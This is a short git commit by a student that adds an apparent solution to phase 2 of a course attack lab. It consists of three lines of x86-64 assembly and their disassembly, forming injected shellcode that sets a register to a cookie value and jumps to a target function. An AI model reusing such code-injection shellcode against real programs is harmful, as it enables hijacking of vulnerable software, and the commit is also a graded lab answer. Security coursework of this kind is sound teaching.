448f1e1af024b933b5fd2d06b40b33e5832b2894
Sunflower <ziwenxu@stu.pku.edu.cn>
2025-10-16 02:17:14 +0000

    Finihsed phase2

---
+++ attacklab/phase2.d
@@ -0,0 +1,10 @@
+
+phase2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 8b f2 61 3e 	mov    $0x3e61f28b,%rdi
+   7:	68 fa 1c 40 00       	push   $0x401cfa
+   c:	c3                   	ret
---
+++ attacklab/phase2.s
@@ -0,0 +1,3 @@
+movq $0x3e61f28b, %rdi
+push $0x401cfa
+ret
